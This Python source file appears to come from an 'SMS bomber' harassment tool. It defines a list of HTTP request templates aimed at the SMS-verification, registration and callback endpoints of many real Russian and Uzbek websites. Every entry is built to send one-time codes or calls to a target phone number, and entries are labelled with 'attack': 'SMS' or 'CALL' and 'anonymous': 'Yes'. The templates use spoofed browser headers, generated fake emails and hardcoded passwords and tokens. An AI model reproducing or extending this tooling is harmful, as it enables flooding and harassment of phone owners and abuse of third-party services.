from src.utils.bomber.user_agent import user_agent
from src.utils.bomber.email import email
from src.utils.bomber.username import username
...
def urls(number):
    return [
        ...
        },
        {
            ...
            'json': {'reqId': '', 'params': {'phone': number, 'language': 'ru-RU', 'route': 'bomber', 'devId': '', 'application': 'icq',},},
        },
        {
        ...
        },
        {
            ...
            'json': {'client': {'name': 'юзер', 'surname': 'нейм', 'phone': number, 'bmail': email(), 'advertising_mail_accepted': True, 'inviter_id': None,}, 'use_cookies': True, 'sign': 'd364c4a1c35179f9834b1c3354a2c913',},
        },
        ...
        },
        {
            ...
            'json': {'bmail': number, 'name': 'User', 'password': 'bRW-qKq-6wT-3Ba',},
        },
        {
        ...
        },
        {
            ...
            'json': {'name': 'User', 'bmail': number, 'password': 'F72-m5d-KEi-gJ6',},
            # Регистрация на номер (если нет акка)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Allplay.uz', 'anonymous': 'Yes'},
        ...
        },
        {
            ...
            'headers': user_agent()[0],
            'json': {'phone': f'{number}', 'code': 'null', 'bmail': 'null', 'activation_method': 2},
        },
        {
        ...
        },
        {
            ...
            'data': {'action': 'digits_check_mob', 'countrycode': '+998', 'mobileNo': number[3:], 'csrf': 'abcb909e0e', 'login': '2', 'username': '', 'bmail': '', 'captcha': '', 'captcha_ses': '', 'digits': '1', 'json': '1', 'whatsapp': '0', 'digits_reg_name': 'User', 'digits_reg_lastname': 'Name', 'digregcode': '+998', 'digits_reg_mail': number[3:], 'dig_otp': '', 'code': '', 'dig_reg_mail': '', 'dig_nounce': 'abcb909e0e',},
        ...
        },
        {
            ...
            'url': 'https://shop.tegen.uz/wp-admin/admin-ajax.php',
            'headers': {'authority': 'shop.tegen.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://shop.tegen.uz', 'referer': 'https://shop.tegen.uz/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.tegen.uz%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'action': 'digits_check_mob', 'countrycode': '+998', 'mobileNo': number[3:], 'csrf': 'abcb909e0e', 'login': '1', 'username': '', 'bmail': '', 'captcha': '', 'captcha_ses': '', 'digits': '1', 'json': '1', 'whatsapp': '0', 'mobmail': number[3:], 'dig_otp': '', 'dig_nounce': 'abcb909e0e', 'digits_login_remember_me': '1', 'digits_redirect_page': 'https://shop.tegen.uz/',},
            # Вход по смс
        },
        {
        ...
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'SAVII.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://savii.uz/brander_smsconfirm_login/send/?telephone={number}&=&code=&type=bomber&code_hash=&_=1679825920421',
        ...
        },
        {
            ...
            'json': {'username': f'+{number}', 'bmail': email(), 'password': 'ziS-xfk-UDz-Ex4', 'repeat_password': 'ziS-xfk-UDz-Ex4', 'full_name': 'User Names Name', 'code': '',},
        },
        {
        ...
        },
        {
            ...
            'json': {'operationName': 'pushLead', 'variables': {'site_version': 2, 'bmail': None, 'phone': number, 'name': '', 'source': {'survey': '', 'type': 16,}, 'utm': {}, 'location': 'popup', 'ga_client_id': '1090519426.1677611429', 'subscription': {'dishes': [], 'promocode': '', 'price': {'total': 0,}, 'payment': 'online', 'profile': {'referrer_code': 'undefined',}, 'categories': [],}, 'platform': 'web',}, 'query': 'mutation pushLead($date: String, $bmail: String, $phone: String, $name: String, $form_name: String, $source: leadSource, $location: String, $utm: leadUtm, $ga_client_id: String, $admitad_uid: String, $subscription: leadSubscription, $roistat_visit: String, $request_questions: String, $partner_id: String, $site_version: Int, $platform: platform) {\n  pushLead(\n    date: $date\n    bmail: $bmail\n    phone: $phone\n    name: $name\n    form_name: $form_name\n    source: $source\n    location: $location\n    utm: $utm\n    ga_client_id: $ga_client_id\n    admitad_uid: $admitad_uid\n    subscription: $subscription\n    roistat_visit: $roistat_visit\n    request_questions: $request_questions\n    partner_id: $partner_id\n    site_version: $site_version\n    platform: $platform\n  ) {\n    success\n    isNewbie\n    isFirstLead\n    id\n    __typename\n  }\n}',},
        },
        {
        ...
        },
        {
            ...
            'data': {'name': 'User', 'username': f'+{number}', 'mail': email(), 'bday': '15/06/1984', 'dispatch1': 'bomber', 'PERSONAL_GENDER': 'M', 'pers_data': 'yes',},
        },
        {
        ...
        },
        {
            ...
            'headers': {'authority': 'kino.tricolor.tv', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://kino.tricolor.tv', 'referer': 'https://kino.tricolor.tv/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phone': number[1:], 'tricolorId': '', 'action': None, 'bomber': None,},
            # Повторная отправка смс
        },
        {
        ...
        },
        {
            ...
            'json': {'phone': number[1:], 'bmail': email(), 'first_name': 'User', 'last_name': 'Name', 'password': 'poGSF-kjhfyv2121J', 'password_confirmation': 'poGSF-kjhfyv2121J', 'grade_tag': '7 класс', 'region_id': '77',},
        },
        {
        ...
        },
        {
            ...
            'data': f'_csrf=5Luqy8489AxyhMdzGvKjO39MVwhKXcPz5OgNSf31PAaK452DmG2jWwPuhgovmut3EH0Sa3k5j4Gnm04dpbNwfw%3D%3D&action=bomber&RegForm%5Buser_id%5D=733776567&RegForm%5Bbranch_id%5D=29254&RegForm%5Bset_id%5D=&RegForm%5Btype%5D=2&RegForm%5Bclient_id%5D=1685981597253581584&RegForm%5Butm_source%5D=yandex%D0%BA%D0%B0%D1%82%D0%B0%D0%BB%D0%BE%D0%B3vsestrani%D0%BC%D1%83%D1%81%D0%BD%D0%B5&RegForm%5Butm_medium%5D=cpc&RegForm%5Butm_content%5D=14051667259&RegForm%5Butm_term%5D=---autotargeting&RegForm%5Bsponsor_id%5D=736636233&RegForm%5Bsex%5D=f&RegForm%5Breturn_url%5D=https%3A%2F%2Ffaberlic.com&RegForm%5Bcountry_id%5D=1&RegForm%5Bsurname%5D=Name&RegForm%5Bname%5D=User&RegForm%5Bpatronymic%5D=Names&RegForm%5Bbirthday%5D=11.11.1991&RegForm%5Bemail%5D={email()}&RegForm%5Bphone%5D={number}&RegForm%5Bcode%5D=',
        },
        {
        ...
        },
        {
            ...
            'json': {'bmail': email(), 'phone': f'+{number}', 'password': 'sfghsfghgfhfgd', 'role': 'customer', 'emailing': True, 'agreement': True, 'termsConfirm': True,},
        },
        {
        ...
        },
        {
            ...
            'json': {'fullName': 'User Names Name', 'msisdn': number, 'bmail': email(), 'subscribe': True,},
        },
        {
        ...
        },
        {
            ...
            'json': {'name': '', 'lastName': '', 'bmail': '', 'phone': f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:]}', 'action': None,},
        },
        {
        ...
        },
        {
            ...
            'headers': {'authority': 'citystarwear.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://citystarwear.com', 'referer': 'https://citystarwear.com/lk/profile/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': number[1:], 'hdlr': 'bsSendCallCode', 'key': 'DOvBhIav34535434v212SEoVINS', 'dataForm[phone]': '9249518462', 'dataForm[callNums]': '', 'dataForm[smsCode]': '', 'dataForm[bmail]': '', 'dataForm[ecode]': '', '4YreJ': 'niKOC7pJmi1BET3puazqvly5E', 'tTCwJ': 'nLYUqjASgdo3mKNoGxLNOQrIU', 'fiGED': 'gww88r5FPtbfCTLxYknQCt47t', 'dyzOM': 'y10RWRSMhFnc1JrxETX96Fu8C', 'VvYbo': '0Ui38ZF9FWGIpmT55oux1K3AV', '6jOgK': '8LBnrkukNu9tkFSp3HsbkgKS9', 'rOzgC': 'Yx4lA7UOIScs997ucA0zJau8k', 'ocRHN': '7itJktUZCsUekX7IKJC3CkC4B', 'jmzjN': 'm5TqxQurYfN6g5coZLNMf512L', 'eQhnD': 'AhYFKa8XHZsAPtrxclwJbKFSh',},
        },
        {
        ...
        },
        {
            ...
            'data': {'bmail': email(), 'telephone': number, 'password': 'QWERarin454545', 'confirm': 'QWERarin454545', 'needUpdateCache': 'false', 'notSimple': 'true'},
            # Регистрация по смс (если нет акка)
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'HappyWear.ru', 'anonymous': 'Yes'},
        ...
        },
        {
            ...
            'data': {'bmail': email(), 'pass': 'aTn-98a-4P6-kJ5', 'phone': number,},
        },
        {
            ...
            'json': {'name': username(), 'bmail': f'7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}', 'password': 'rfctvgybhunjimko', 'politics': True, 'distribution': True, 'code': '',},
        },
]